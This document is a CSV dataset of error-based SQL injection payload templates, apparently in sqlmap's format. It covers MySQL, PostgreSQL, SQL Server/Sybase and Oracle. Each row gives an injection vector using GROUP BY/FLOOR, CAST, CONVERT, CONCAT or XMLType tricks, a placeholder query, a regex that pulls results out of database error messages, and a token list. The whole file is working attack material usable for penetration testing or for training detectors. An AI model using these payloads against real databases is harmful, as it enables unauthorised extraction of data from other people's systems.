title,stype,level,risk,clause,where,vector,request/payload,response/grep,details/dbms/0,details/dbms_version,request/comment,details/dbms/1,tokens
MySQL OR error-based - WHERE or HAVING clause (FLOOR),2,5,3,"1,8,9",2,"OR 1 GROUP BY CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)","OR 1 GROUP BY CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,,#,,"['OR', '1', 'GROUP', 'BY', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', ')', ',', '[DELIMITER_STOP]', ',', 'FLOOR', '(', 'RAND', '(', '0', ')', '*', '2', ')', ')', 'HAVING', 'MIN', '(', '0', ')']"
PostgreSQL AND error-based - WHERE or HAVING clause,2,1,1,"1,8,9",1,AND [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC),AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],PostgreSQL,,,,"['AND', '[RANDNUM]', '=', 'CAST', '(', '[DELIMITER_START]', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', ')', 'text', '[DELIMITER_STOP]', 'AS', 'NUMERIC', ')']"
PostgreSQL OR error-based - WHERE or HAVING clause,2,1,3,"1,8,9",2,OR [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC),OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],PostgreSQL,,,,"['OR', '[RANDNUM]', '=', 'CAST', '(', '[DELIMITER_START]', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', ')', 'text', '[DELIMITER_STOP]', 'AS', 'NUMERIC', ')']"
Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN),2,1,1,"1,8,9",1,AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')),AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Microsoft SQL Server,,,Sybase,"['AND', '[RANDNUM]', 'IN', '(', 'SELECT', '(', '[DELIMITER_START]', '+', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', ')', '+', '[DELIMITER_STOP]', ')', ')']"
Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN),2,2,3,"1,8,9",2,OR [RANDNUM] IN (SELECT ('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')),OR [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Microsoft SQL Server,,,Sybase,"['OR', '[RANDNUM]', 'IN', '(', 'SELECT', '(', '[DELIMITER_START]', '+', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', ')', '+', '[DELIMITER_STOP]', ')', ')']"
Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT),2,2,1,"1,8,9",1,"AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))","AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Microsoft SQL Server,,,Sybase,"['AND', '[RANDNUM]', '=', 'CONVERT', '(', 'INT', ',', '(', 'SELECT', '[DELIMITER_START]', '+', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', ')', '+', '[DELIMITER_STOP]', ')', ')']"
Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT),2,3,3,"1,8,9",2,"OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))","OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Microsoft SQL Server,,,Sybase,"['OR', '[RANDNUM]', '=', 'CONVERT', '(', 'INT', ',', '(', 'SELECT', '[DELIMITER_START]', '+', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', ')', '+', '[DELIMITER_STOP]', ')', ')']"
Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT),2,2,1,"1,8,9",1,"AND [RANDNUM]=CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')","AND [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Microsoft SQL Server,,,Sybase,"['AND', '[RANDNUM]', '=', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', ')', ',', '[DELIMITER_STOP]', ')']"
Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT),2,3,3,"1,8,9",2,"OR [RANDNUM]=CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')","OR [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Microsoft SQL Server,,,Sybase,"['OR', '[RANDNUM]', '=', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', ')', ',', '[DELIMITER_STOP]', ')']"
Oracle AND error-based - WHERE or HAVING clause (XMLType),2,1,1,"1,9",1,"AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'),'#','[HASH_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)",AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Oracle,,,,"['AND', '[RANDNUM]', '=', '(', 'SELECT', 'UPPER', '(', 'XMLType', '(', 'CHR', '(', '60', ')', 'CHR', '(', '58', ')', '[DELIMITER_START]', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', 'FROM', 'DUAL', ')', '[DELIMITER_STOP]', 'CHR', '(', '62', ')', ')', ')', 'FROM', 'DUAL', ')']"
Oracle OR error-based - WHERE or HAVING clause (XMLType),2,1,3,"1,9",2,"OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)",OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Oracle,,,,"['OR', '[RANDNUM]', '=', '(', 'SELECT', 'UPPER', '(', 'XMLType', '(', 'CHR', '(', '60', ')', 'CHR', '(', '58', ')', '[DELIMITER_START]', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', 'FROM', 'DUAL', ')', '[DELIMITER_STOP]', 'CHR', '(', '62', ')', ')', ')', 'FROM', 'DUAL', ')']"
